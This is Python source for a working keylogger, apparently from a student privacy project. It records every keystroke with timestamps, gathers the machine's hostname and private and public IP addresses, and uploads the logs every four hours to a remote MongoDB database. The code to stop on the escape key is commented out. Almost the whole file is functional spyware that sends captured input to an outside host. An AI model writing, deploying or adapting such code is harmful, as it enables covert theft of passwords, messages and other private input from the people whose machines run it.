# This is a keylogger built with Python.
# I used a python plugin called pynput-master in order
# to track user input.
# The input is logged to a text file.
# Moreover, I also log the user's host name and ip address
# when the script is run.
# The purpose was to test to see how easy it can be to create
# a piece of software that is potentially dangerous in invading
# privacy, since privacy is a big topic in Computers and Society

# library
from pynput.keyboard import Key, Listener
from pymongo import MongoClient
# vanilla
import logging
# import socket so I can get host name and ip address
import socket
import ipgetter
# import threading for a set interval
import threading
# for date and time
import datetime

# variables to store IP address and host name if not available
host_name = "N/A"
host_ip = "N/A"
external_ip = "N/A"
# beginning time of script
start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
# this is treated like a text file, but instead it is a variable
log_text = ""

def writeText(start_time, host_name, host_ip, external_ip):
    global log_text
    log_text = ("Start Time: " + start_time + "\n")
    log_text += ("Hostname: " + host_name + "\n")
    log_text += ("Private IP: " + host_ip + "\n")
    log_text += ("Public IP: " + external_ip + "\n")

# Function to display hostname and 
# IP address 
def get_Host_name_IP(): 
    global external_ip
    try: 
        host_name = socket.gethostname() 
        host_ip = socket.gethostbyname(host_name)
        external_ip = ipgetter.myip()
        print("Start Time:", start_time)
        print("Hostname:", host_name) 
        print("Private IP:", host_ip)
        print("Public IP:", external_ip) 
        writeText(start_time, host_name, host_ip, external_ip)
    except: 
        external_ip = "N/A"
        print("Unable to get Hostname and IP")
        writeText(start_time, host_name, host_ip, external_ip)

# Driver code 
get_Host_name_IP() # Function call

def set_interval(func, sec):
    def func_wrapper():
        set_interval(func, sec)
        func()
    t = threading.Timer(sec, func_wrapper)
    t.start()
    return t

uri = "MONGODB_URI"

client = MongoClient(uri,
        connectTimeoutMS=30000,
        socketTimeoutMS=None)

db = client.get_database()
logs = db.logs

def uploadFile():
    insertion_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    doc = {
    "file_name": insertion_time + " Log.txt",
    "ip": external_ip,
    "contents" : log_text }
    logs.insert_one(doc)
    print("Log uploaded at " + insertion_time)
    get_Host_name_IP()

timer = set_interval(uploadFile, 14400)

# this is from the library
def on_press(key):
    global log_text
    log_text += (datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S,%f")[:-3] + ": " + str(key) + "\n")
    # logging can end if the escape key is pushed
    # if key == Key.esc:
        #return false

# the listener is listening to the keyboard on press as a listener
# this says the listener is on
with Listener(on_press=on_press) as listener:
    listener.join()
